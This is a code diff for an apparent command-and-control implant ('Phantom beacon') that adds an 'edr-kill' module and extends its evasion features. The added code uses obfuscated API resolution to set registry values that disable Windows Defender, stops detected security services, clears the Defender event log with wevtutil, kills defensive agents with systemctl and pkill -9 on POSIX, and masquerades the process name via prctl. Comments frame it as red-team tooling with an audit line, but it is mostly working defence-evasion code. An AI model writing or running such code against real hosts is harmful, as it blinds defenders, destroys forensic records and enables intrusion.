+//     twice per key, and `sc stop` once per service: process-creation events
+//     are the single loudest thing an EDR and a SIEM both record, and they
+//     were coming from the module whose whole point is not being noticed.
+//     The same effects go through advapi32, resolved from the PEB: no child
+//     process, no command line to observe, and the status code says WHY a
+//     write was refused instead of "failed/blocked (?)".
+//
+// The capability stays. What changes is that it is the operator's explicit
+// command, it is measurable, and it leaves a line the engagement report can
+// name (see kAuditLine()).
+namespace edrkill {
+
+// The one line the Python side has to surface: the guardrails manifest
+// (phantom/utils/guardrails.py) records what protection the engagement was
+// sold with, and the report has to record when the target's own AV was off.
+inline const char* kAuditLine() {
+    return "audit=operator disabled the target's protections (edr-kill) — "
+           "this MUST appear in the engagement report: if the client had an "
+           "incident while its AV was off, the record is the defence.";
+}
+
+struct DefenderPolicy {
+    bool available = false;   // advapi32 and the three registry exports
+    int  attempted = 0;       // values the action tried to write
+    int  written = 0;         // ... and that the registry accepted
+};
+
+#ifdef _WIN32
+
+// ASCII literal (compile-time XOR) -> wide, for the wide registry API.
+inline void _widen(const char* in, wchar_t* out, size_t cap) {
+    size_t i = 0;
+    for (; in && in[i] && i + 1 < cap; ++i)
+        out[i] = static_cast<wchar_t>(static_cast<unsigned char>(in[i]));
+    out[i] = 0;
+}
+
+// The two registry values `reg add` used to write — through RegSetValueEx
+// this time. No process is created for a registry write.
+inline DefenderPolicy disable_defender() {
+    DefenderPolicy out;
+    HMODULE hAdv = peb::GetModuleByHash(peb::HASH_ADVAPI32);
+    if (!hAdv) {
+        auto pLoad = (HMODULE(WINAPI*)(LPCSTR))
+            peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
+        if (pLoad) hAdv = pLoad(XOR_DEC(XOR_STR("advapi32.dll")).c_str());
+    }
+    if (!hAdv) return out;
+    auto pCreate = (LSTATUS(WINAPI*)(HKEY, LPCWSTR, DWORD, REGSAM,
+                                     LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD))
+        peb::GetProcByHash(hAdv, FN_REGCREATEKEYEXW);
+    auto pSet = (LSTATUS(WINAPI*)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*,
+                                  DWORD))
+        peb::GetProcByHash(hAdv, FN_REGSETVALUEEXW);
+    auto pClose = (LSTATUS(WINAPI*)(HKEY))
+        peb::GetProcByHash(hAdv, FN_REGCLOSEKEY);
+    if (!pCreate || !pSet || !pClose) return out;
+    out.available = true;
+
+    // std::string, NOT a `const char*` into the temporary: DecryptedString
+    // WIPES its buffer in its destructor, so a raw pointer taken from it
+    // dangles over zeroed memory (which is exactly how the old
+    // `const char* pref = XOR_DEC(...).c_str()` produced an EMPTY command:
+    // that `system("HKLM\\SOFTWARE\\...")` could only ever fail, which read
+    // as "tamper protection blocked it").
+    const std::string paths[2] = {
+        XOR_DEC(XOR_STR("SOFTWARE\\Policies\\Microsoft\\Windows Defender"
+                        "\\Real-Time Protection")).c_str(),
+        XOR_DEC(XOR_STR("SOFTWARE\\Microsoft\\Windows Defender"
+                        "\\Real-Time Protection")).c_str(),
+    };
+    const std::string values[2] = {
+        XOR_DEC(XOR_STR("DisableRealtimeMonitoring")).c_str(),
+        XOR_DEC(XOR_STR("DisableIOAVProtection")).c_str(),
+    };
+    wchar_t wpath[256] = {0};
+    wchar_t wvalue[64] = {0};
+    for (const std::string& path : paths) {
+        HKEY key = nullptr;
+        DWORD disposition = 0;
+        _widen(path.c_str(), wpath, 256);
+        if (pCreate(HKEY_LOCAL_MACHINE, wpath, 0, KEY_SET_VALUE, nullptr, &key,
+                    &disposition) != ERROR_SUCCESS || !key)
+            continue;   // one key can be locked down while the other is not
+        for (const std::string& value : values) {
+            DWORD one = 1;
+            _widen(value.c_str(), wvalue, 64);
+            out.attempted++;
+            if (pSet(key, wvalue, 0, REG_DWORD,
+                     reinterpret_cast<const BYTE*>(&one), sizeof(one))
+                == ERROR_SUCCESS)
+                out.written++;
+        }
+        pClose(key);
+    }
+    return out;
+}
+
+// Service control through the SC manager: `sc stop <name>` without `sc.exe`.
+struct ScmApi {
+    decltype(&OpenSCManagerA) open_manager = nullptr;
+    decltype(&OpenServiceA)   open_service = nullptr;
+    decltype(&ControlService) control      = nullptr;
+    decltype(&CloseServiceHandle) close    = nullptr;
+
+    static ScmApi resolve() {
+        ScmApi api;
+        HMODULE h = peb::GetModuleByHash(peb::HASH_ADVAPI32);
+        if (!h) return api;
+        api.open_manager = (decltype(&OpenSCManagerA))
+            peb::GetProcByHash(h, FN_OPENSCMANAGERA);
+        api.open_service = (decltype(&OpenServiceA))
+            peb::GetProcByHash(h, FN_OPENSERVICEA);
+        api.control = (decltype(&ControlService))
+            peb::GetProcByHash(h, FN_CONTROLSERVICE);
+        api.close = (decltype(&CloseServiceHandle))
+            peb::GetProcByHash(h, FN_CLOSESERVICEHANDLE);
+        return api;
+    }
+
+    bool ok() const {
+        return open_manager && open_service && control && close;
+    }
+};
+
+inline bool stop_service(const ScmApi& api, const std::string& name) {
+    SC_HANDLE scm = api.open_manager(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (!scm) return false;
+    SC_HANDLE svc = api.open_service(scm, name.c_str(),
+                                     SERVICE_STOP | SERVICE_QUERY_STATUS);
+    bool stopped = false;
+    if (svc) {
+        SERVICE_STATUS status{};
+        stopped = api.control(svc, SERVICE_CONTROL_STOP, &status) != 0;
+        api.close(svc);
+    }
+    api.close(scm);
+    return stopped;
+}
+
+#endif  // _WIN32
+
+// ── READ-ONLY: what is on this host, and nothing else ──────────────────────
+// The operator looks before acting, and the engagement report can quote the
+// same text afterwards. No registry write, no service control, no process
+// creation by THIS function: `found` (if given) carries the detection to the
+// action so the (loud) service enumeration runs ONCE.
+inline std::string kill_av_report(std::vector<std::string>* found = nullptr) {
+    std::ostringstream out;
+    std::vector<std::string> services = dfns::detect_defensive_services();
+    if (found) *found = services;
+    out << "detected_defensive_services=" << services.size() << "\n";
+    for (const std::string& s : services) out << "  found " << s << "\n";
+#ifdef _WIN32
+    // kernel-mode filter drivers + userland hooks (read-only probe)
+    {
+        edrcheck::EdrReport rep;
+        edrcheck::report(rep);
+        out << "kernel_edr_drivers=" << rep.known_edr
+            << " ntdll_hooked=" << (rep.ntdll_hooked ? "yes" : "no")
+            << " hooked_stubs=" << rep.hooked_stubs << "\n";
+        if (rep.drivers[0]) out << rep.drivers;
+    }
+#else
+    // POSIX: report the defensive stack (LSM / eBPF / audit / known agents).
+    {
+        edrcheck::EdrReport rep;
+        edrcheck::report(rep);
+        out << "lsm=" << (rep.lsm.empty() ? "none" : rep.lsm)
+            << " known_defensive=" << rep.known_edr << "\n";
+    }
+#endif
+    return out.str();
+}
+
+// ── ACTION: what the operator's `edr-kill` does ────────────────────────────
+// Detect (read-only), act, then DESCRIBE the outcome. Called from exactly one
+// place: the beacon dispatcher, on the operator's command.
+inline std::string kill_av() {
+    std::ostringstream out;
+    std::vector<std::string> services;
+    out << kill_av_report(&services);          // 1) DETECT — writes nothing
+    out << "action_taken=edr-kill\n";          // 2) ACT, and say so
+    int stopped = 0, failed = 0;
+#ifdef _WIN32
+    DefenderPolicy policy = disable_defender();
+    if (!policy.available) {
+        out << "defender_policy=not attempted (advapi32 not resolvable)\n";
+    } else {
+        out << "defender_policy=" << policy.written << "/" << policy.attempted
+            << " written";
+        if (policy.attempted && policy.written == policy.attempted)
+            out << " (Tamper Protection may re-enable it on the next scan)";
+        else
+            out << " — refused by the registry (Tamper Protection? "
+                   "insufficient rights?)";
+        out << "\n";
+    }
+    ScmApi api = ScmApi::resolve();
+    if (api.ok()) {
+        for (const std::string& svc : services) {
+            if (stop_service(api, svc)) { out << "stopped " << svc << "\n"; ++stopped; }
+            else { out << "could_not_stop " << svc << "\n"; ++failed; }
+        }
+    } else {
+        out << "service_control=not attempted (SC manager exports missing)\n";
+    }
+    out << "services_stopped=" << stopped << " failed=" << failed << "\n";
+    // The last process-creating step, kept visible on purpose: clearing the
+    // Defender log has an in-process equivalent (wevtapi!EvtClearLog) but its
+    // semantics differ (it fails on an in-use channel and needs the channel
+    // name as a wide string), so it is a deliberate, separate change rather
+    // than part of this one. An operator can also drop it: the line below is
+    // the only reason a `wevtutil` child exists in this module.
+    system(XOR_DEC(XOR_STR("wevtutil cl Microsoft-Windows-Windows Defender"
+                           "/Operational >nul 2>&1")).c_str());
+#else
+    // POSIX: unit control has no in-process API, so this stays a child
+    // process (systemctl, then pkill for a daemon with no unit).
+    for (const std::string& svc : services) {
+        std::string cmd = std::string(XOR_DEC(XOR_STR("systemctl stop ")).c_str()) + svc +
+                          XOR_DEC(XOR_STR(" 2>/dev/null")).c_str();
+        if (system(cmd.c_str()) == 0) { out << "stopped " << svc << "\n"; ++stopped; continue; }
+        std::string base = svc;
+        size_t dot = base.find(".service");
+        if (dot != std::string::npos) base = base.substr(0, dot);
+        std::string pk = std::string(XOR_DEC(XOR_STR("pkill -9 -x ")).c_str()) + base +
+                         XOR_DEC(XOR_STR(" 2>/dev/null")).c_str();
+        if (system(pk.c_str()) == 0) { out << "killed " << base << "\n"; ++stopped; }
+        else { out << "could_not_stop " << svc << "\n"; ++failed; }
+    }
+    out << "services_stopped=" << stopped << " failed=" << failed << "\n";
+#endif
+    if (services.empty())
+        out << "no defensive service detected (or insufficient privileges to enumerate)\n";
+    out << kAuditLine() << "\n";
+    return out.str();
+}
+
+}  // namespace edrkill
+
+namespace anti {  // reopened after edrcheck
 
 // Stalling technique to frustrate automated sandboxes
 // Performs heavy calculations to delay execution without relying solely on Sleep()
@@ -439,28 +1290,12 @@ inline void stalling_delay(int intensity) {
             count += (j ^ i) * (i + 1);
         }
     }
+    // The loop's whole purpose is CPU work, but the accumulator must be
+    // READ or GCC 16 (and clang) correctly diagnose it as set-but-unused.
+    // A real read keeps the volatile work observable without suppressing
+    // the warning.
+    (void)count;
 }
-
-// ────────────────────────────────────────────────────────────────────────────
-//  4. SLEEP OBFUSCATION (Memory Encryption)
-// ────────────────────────────────────────────────────────────────────────────
-
-namespace mem {
-
-// Simple XOR encryption for memory regions
-inline void xor_region(uint8_t* data, size_t size, uint8_t key) {
-    for (size_t i = 0; i < size; ++i) {
-        data[i] ^= key;
-    }
-}
-
-#ifdef _WIN32
-// Encrypt the current process's primary thread stack/heap (simplified)
-// In a real scenario, we'd walk the VAD or use more complex heap enumeration.
-// For the Phantom beacon, we'll focus on encrypting our own strings and state.
-#endif
-
-} // namespace mem
 
 // ────────────────────────────────────────────────────────────────────────────
 //  5. PROCESS MASQUERADING
@@ -493,7 +1328,21 @@ inline void rename_process(const wchar_t* newName) {
     }
 }
 #else
-inline void rename_process(const wchar_t* newName) {}
+// POSIX has no SetConsoleTitle-style masquerade. Linux exposes
+// prctl(PR_SET_NAME), which renames the process as seen in /proc/<pid>/comm
+// and by `ps -o comm`; macOS offers no supported process-rename API, so there
+// it is a documented no-op.
+inline void rename_process(const wchar_t* newName) {
+#ifndef __APPLE__
+    if (!newName) return;
+    char narrow[16] = {0};
+    for (size_t i = 0; i < 15 && newName[i]; ++i)
+        narrow[i] = static_cast<char>(newName[i] & 0x7F);
+    prctl(PR_SET_NAME, narrow, 0, 0, 0);
+#else
+    (void)newName;
+#endif
+}
 #endif
 
 } // namespace masquerade
